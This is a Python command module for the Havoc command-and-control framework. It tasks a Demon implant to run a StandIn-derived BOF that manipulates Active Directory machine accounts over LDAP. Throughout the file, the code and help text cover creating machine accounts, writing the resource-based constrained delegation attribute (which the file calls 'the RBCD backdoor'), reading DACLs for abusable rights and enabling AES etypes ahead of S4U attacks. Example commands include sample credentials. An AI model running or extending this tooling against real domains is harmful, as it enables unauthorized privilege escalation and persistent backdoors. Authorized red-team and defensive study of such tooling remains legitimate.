from havoc import Demon, RegisterCommand, RegisterModule


def _parse_flags(param, flags):
    """Parse space-split tokens into a dict of flag-name -> value.
    Supports '--flag value' and '--flag=value'."""
    values = {name: spec[1] for name, spec in flags.items()}
    i = 0
    while i < len(param):
        p = param[i]
        matched = None
        for name in flags:
            if p == name or p.startswith(name + "="):
                matched = name
                break
        if matched is None:
            i += 1
            continue

        if p == matched:
            if i + 1 >= len(param):
                return values, f"flag {matched} requires a value"
            val = param[i + 1]
            i += 2
        else:
            val = p.split("=", 1)[1]
            i += 1

        values[matched] = val

    return values, None


def standin_cmd(demonID, *param):
    demon  = Demon(demonID)
    packer = Packer()

    flags = {
        "--computer": (str, ""),
        "--object":   (str, ""),
        "--sid":      (str, ""),
        "--domain":   (str, ""),
        "--user":     (str, ""),
        "--pass":     (str, ""),
        "--enctypes": (str, ""),
    }
    values, err = _parse_flags(param, flags)
    if err:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, err)
        return False

    computer = values["--computer"]
    obj      = values["--object"]
    sid      = values["--sid"]
    domain   = values["--domain"]
    user     = values["--user"]
    passw    = values["--pass"]
    enctypes = values["--enctypes"]

    bools = [p for p in param if p in ("--make", "--disable", "--delete", "--remove", "--access", "--enc", "--rbcd")]
    if "--make" in bools:
        mode, opname = 0, "create machine account"
    elif "--disable" in bools:
        mode, opname = 1, "disable machine account"
    elif "--delete" in bools:
        mode, opname = 2, "delete machine account"
    elif sid:
        mode, opname = 3, "set msDS-AllowedToActOnBehalfOfOtherIdentity"
    elif "--remove" in bools:
        mode, opname = 4, "remove msDS-AllowedToActOnBehalfOfOtherIdentity"
    elif obj and "--access" in bools:
        mode, opname = 6, "list object access permissions"
    elif "--rbcd" in bools:
        mode, opname = 9, "read msDS-AllowedToActOnBehalfOfOtherIdentity"
    elif "--enc" in bools:
        mode, opname = 7, "read msDS-SupportedEncryptionTypes"
    elif enctypes:
        mode, opname = 8, "set msDS-SupportedEncryptionTypes"
    elif obj:
        mode, opname = 5, "fetch object SID"
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage:\n"
            "  standin --computer <name> --make | --disable | --delete | --sid <SID> | --remove | --enc | --enctypes <N>\n"
            "  standin --object <ldap-filter> [--access]\n"
            "  [--domain <d> --user <u> --pass <p>]")
        return False

    # For --object (and --object --access), the LDAP filter rides in the 'computer' slot.
    if mode in (5, 6):
        target = obj
    else:
        target = computer

    if not target:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "--computer (or --object for a filter) is required")
        return False

    if mode == 3 and not sid:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--sid is required for the RBCD set operation")
        return False

    if mode == 8 and not enctypes:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--enctypes <N> is required (28 = RC4+AES128+AES256)")
        return False

    packer.addint(mode)
    packer.addstr(target)
    packer.addstr(sid)
    packer.addstr(domain)
    packer.addstr(user)
    packer.addstr(passw)
    packer.addstr(enctypes)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to {opname} '{target}'")
    demon.InlineExecute(TaskID, "go", "bin/standin.x64.o", packer.getbuffer(), False)
    return TaskID


STANDIN_HELP = (
    "Resource-Based Constrained Delegation (RBCD) primitives, ported from\n"
    "FuzzySecurity/StandIn. Manipulates machine accounts over LDAP.\n"
    "\n"
    "USAGE:\n"
    "  standin --computer <name> --make\n"
    "      Create a machine account (objectClass=Computer, sAMAccountName,\n"
    "      userAccountControl=4096, dnsHostName, SPNs, unicodePwd).\n"
    "      Subject to ms-DS-MachineAccountQuota (default 10).\n"
    "  standin --computer <name> --disable\n"
    "      Set ACCOUNTDISABLE (userAccountControl |= 0x2).\n"
    "  standin --computer <name> --delete\n"
    "      Subtree-delete the machine object.\n"
    "  standin --computer <name> --sid <SID>\n"
    "      Write msDS-AllowedToActOnBehalfOfOtherIdentity granting <SID>\n"
    "      the allowed-to-act right (the RBCD backdoor).\n"
    "  standin --computer <name> --remove\n"
    "      Clear msDS-AllowedToActOnBehalfOfOtherIdentity.\n"
    "  standin --object <ldap-filter>\n"
    "      Resolve an LDAP filter and print sAMAccountName + objectSid\n"
    "      (use it to get the SID of a machine account you just --make'd).\n"
    "  standin --object <ldap-filter> --access\n"
    "      Read the object's DACL and flag which principals hold the\n"
    "      RBCD-enabling rights (GenericAll/GenericWrite/WriteDacl/\n"
    "      WriteOwner/WriteProperty).\n"
    "  standin --computer <name> --enc\n"
    "      Read msDS-SupportedEncryptionTypes and print which Kerberos\n"
    "      etypes (RC4/AES128/AES256) the account supports. Unset means\n"
    "      RC4-only -> AES256 S4U fails with KDC_ERR_ETYPE_NOTSUPP.\n"
    "  standin --computer <name> --enctypes <N>\n"
    "      Set msDS-SupportedEncryptionTypes. 28 = RC4+AES128+AES256.\n"
    "      24 = AES128+AES256 (RC4 off). Use this to enable AES on a\n"
    "      machine account you created out-of-band before running S4U.\n"
    "\n"
    "OPTIONAL (alternate credentials / target domain):\n"
    "  --domain <d>  Domain (NetBIOS or DNS). Selects the DC; with --user/\n"
    "                --pass it is also the credential domain.\n"
    "  --user <u>    Username for the LDAP bind.\n"
    "  --pass <p>    Password for the LDAP bind.\n"
    "\n"
    "EXAMPLES:\n"
    "  standin --computer Innsmouth --make\n"
    "  standin --object samaccountname=Innsmouth$\n"
    "  standin --object samaccountname=HWKSTN2$ --access\n"
    "  standin --computer HackerPC --enc\n"
    "  standin --computer HackerPC --enctypes 28\n"
    "  standin --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543-2611\n"
    "  standin --computer Providence --remove\n"
    "  standin --computer Arkham --disable\n"
    "  standin --computer Danvers --delete\n"
    "  standin --computer Innsmouth --make --domain redhook --user RFludd --pass 'Cl4vi$Alchemi4e'\n"
)

RegisterCommand(standin_cmd, "", "standin", STANDIN_HELP, 0,
                "--computer <name> (...) | --object <ldap-filter>",
                "--computer Innsmouth --make")
